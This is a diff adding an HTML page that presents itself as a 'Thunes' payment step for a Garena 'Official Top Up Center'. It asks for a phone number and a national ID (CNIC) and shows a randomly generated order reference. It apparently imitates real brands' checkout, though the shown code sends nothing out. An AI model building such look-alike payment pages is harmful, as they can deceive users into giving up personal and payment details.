@@ -1,0 +1,299 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Payment Identification | Thunes Gateway</title>
+    <link rel="icon" type="image/png" href="images/garena-symbol-logo.png">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="stylesheet" href="style.css">
+    <style>
+        body {
+            background-color: #f8f9fa;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            min-height: 100vh;
+        }
+
+        .thunes-header {
+            margin-top: 40px;
+            margin-bottom: 30px;
+            text-align: center;
+        }
+
+        .thunes-logo-text {
+            font-size: 32px;
+            font-weight: 800;
+            color: #0b3d2c;
+            letter-spacing: -0.5px;
+        }
+
+        .thunes-logo-dot {
+            color: #25d366;
+        }
+
+        .gateway-card {
+            width: 100%;
+            max-width: 760px;
+            background: #ffffff;
+            border-radius: 12px;
+            box-shadow: 0 8px 30px rgba(0,0,0,0.06);
+            display: flex;
+            overflow: hidden;
+            margin-bottom: 40px;
+        }
+
+        @media (max-width: 768px) {
+            .thunes-header {
+                margin-top: 15px;
+                margin-bottom: 15px;
+            }
+            .thunes-logo-text {
+                font-size: 22px;
+            }
+            .gateway-card {
+                flex-direction: row;
+                margin-bottom: 20px;
+                width: 95%;
+            }
+            .gateway-left-panel {
+                width: 55%;
+                padding: 16px 14px;
+            }
+            .gateway-right-panel {
+                width: 45%;
+                padding: 16px 14px;
+            }
+            .gateway-title, .order-summary-title {
+                font-size: 14px;
+                margin-bottom: 10px;
+            }
+            .gateway-method-logo {
+                height: 28px;
+                margin-bottom: 12px;
+            }
+            .gateway-form input {
+                padding: 8px 10px;
+                font-size: 12px;
+            }
+            .btn-gateway-next {
+                padding: 8px 0;
+                font-size: 13px;
+            }
+            .summary-row {
+                font-size: 11px;
+                padding: 6px 0;
+            }
+        }
+
+        .gateway-left-panel {
+            width: 55%;
+            padding: 40px 36px;
+            display: flex;
+            flex-direction: column;
+            align-items: flex-start;
+        }
+
+        .gateway-method-logo {
+            height: 48px;
+            max-width: 140px;
+            object-fit: contain;
+            margin-bottom: 24px;
+        }
+
+        .gateway-title {
+            font-size: 20px;
+            font-weight: 700;
+            color: #222;
+            margin-bottom: 20px;
+        }
+
+        .gateway-form {
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            gap: 14px;
+        }
+
+        .gateway-form input {
+            width: 100%;
+            padding: 12px 14px;
+            border: 1px solid #dcdcdc;
+            border-radius: 6px;
+            font-size: 14px;
+            outline: none;
+            transition: border-color 0.2s;
+        }
+
+        .gateway-form input:focus {
+            border-color: #25d366;
+        }
+
+        .btn-gateway-next {
+            background-color: #25d366;
+            color: #ffffff;
+            border: none;
+            border-radius: 6px;
+            padding: 12px 0;
+            font-weight: 700;
+            font-size: 15px;
+            cursor: pointer;
+            margin-top: 10px;
+            transition: background 0.2s;
+        }
+
+        .btn-gateway-next:hover {
+            background-color: #1eb956;
+        }
+
+        .gateway-right-panel {
+            width: 45%;
+            background: #f8f9fa;
+            padding: 40px 30px;
+            border-left: 1px solid #eee;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .order-summary-title {
+            font-size: 20px;
+            font-weight: 700;
+            color: #222;
+            margin-bottom: 6px;
+        }
+
+        .order-reference-id {
+            font-size: 13px;
+            color: #888;
+            margin-bottom: 40px;
+        }
+
+        .order-total-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-size: 15px;
+            font-weight: 700;
+            color: #222;
+            margin-top: auto;
+        }
+
+        @media (max-width: 768px) {
+            .gateway-card {
+                flex-direction: column;
+                max-width: 90%;
+            }
+            .gateway-left-panel, .gateway-right-panel {
+                width: 100%;
+                padding: 24px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Header Navbar -->
+    <header class="navbar">
+        <div class="navbar-container">
+            <a href="index.html" class="brand" style="text-decoration: none;">
+                <img src="images/garena-logoandname.png" alt="Garena Logo" class="brand-logo">
+                <span class="divider">|</span>
+                <span class="brand-subtitle">Official Top Up Center</span>
+            </a>
+            <div class="user-dp-container">
+                <div class="dp-circle">
+                    <img src="images/freefire-game-logo.png" alt="User DP" class="user-dp-img">
+                </div>
+            </div>
+        </div>
+    </header>
+
+    <div class="thunes-header">
+        <div class="thunes-logo-text">Thunes<span class="thunes-logo-dot">.</span></div>
+    </div>
+
+    <div class="gateway-card">
+        <!-- Left Panel: Payment Method Specific Inputs -->
+        <div class="gateway-left-panel">
+            <img src="images/konnect-logo.png" alt="Payment Logo" class="gateway-method-logo" id="gatewayLogo">
+            <h3 class="gateway-title">Identification</h3>
+
+            <form class="gateway-form" id="gatewayForm" onsubmit="return false;">
+                <input type="tel" id="mobileNumber" placeholder="Phone number" required>
+                <input type="text" id="cnicNumber" placeholder="CNIC (Optional for mobile billing)">
+                <button type="submit" class="btn-gateway-next" id="btnGatewayNext">Next</button>
+            </form>
+        </div>
+
+        <!-- Right Panel: Order Summary & Reference ID -->
+        <div class="gateway-right-panel">
+            <h3 class="order-summary-title">Order summary</h3>
+            <span class="order-reference-id" id="refOrderNum">#975005182421</span>
+
+            <div class="order-total-row">
+                <span>Total :</span>
+                <span id="gatewayPriceText">Rs. 10000.00</span>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+            const params = new URLSearchParams(window.location.search);
+            const method = params.get('method') || localStorage.getItem('checkout_method') || 'Konnect';
+            const price = params.get('price') || localStorage.getItem('checkout_final_price') || '10000';
+
+            // Random reference number generation
+            const randomRef = '#' + Math.floor(100000000000 + Math.random() * 900000000000);
+            document.getElementById('refOrderNum').textContent = randomRef;
+            document.getElementById('gatewayPriceText').textContent = `Rs. ${parseFloat(price).toFixed(2)}`;
+
+            const gatewayLogo = document.getElementById('gatewayLogo');
+            const cnicInput = document.getElementById('cnicNumber');
+
+            // Set Logo according to selected payment method
+            switch(method) {
+                case 'Konnect':
+                    gatewayLogo.src = 'images/konnect-logo.png';
+                    cnicInput.style.display = 'block';
+                    break;
+                case 'JazzCash':
+                    gatewayLogo.src = 'images/jazzcash-logo.png';
+                    cnicInput.style.display = 'none';
+                    break;
+                case 'EasyPaisa':
+                    gatewayLogo.src = 'images/easypaisa-logo.png';
+                    cnicInput.style.display = 'none';
+                    break;
+                case 'Zong DCB':
+                    gatewayLogo.src = 'images/Zong-5G-Logo.png';
+                    cnicInput.style.display = 'none';
+                    break;
+                case 'Jazz Mobile Billing':
+                    gatewayLogo.src = 'images/jazz-mobile-billing.png';
+                    cnicInput.style.display = 'none';
+                    break;
+                case 'Telenor Mobile Billing':
+                    gatewayLogo.src = 'images/telenor-logo.png';
+                    cnicInput.style.display = 'none';
+                    break;
+                default:
+                    gatewayLogo.src = 'images/konnect-logo.png';
+            }
+
+            // Submit Payment Details -> Redirect to Pending Transaction Page
+            document.getElementById('btnGatewayNext').addEventListener('click', () => {
+                const phone = document.getElementById('mobileNumber').value.trim();
+                if (!phone) {
+                    alert('Please enter your mobile phone number.');
+                    return;
+                }
+
+                // Redirect to Pending Transaction Page
+                window.location.href = `transaction-status.html?ref=${encodeURIComponent(randomRef)}&price=${price}&method=${encodeURIComponent(method)}`;
+            });
+        });
+    </script>
+</body>
+</html>
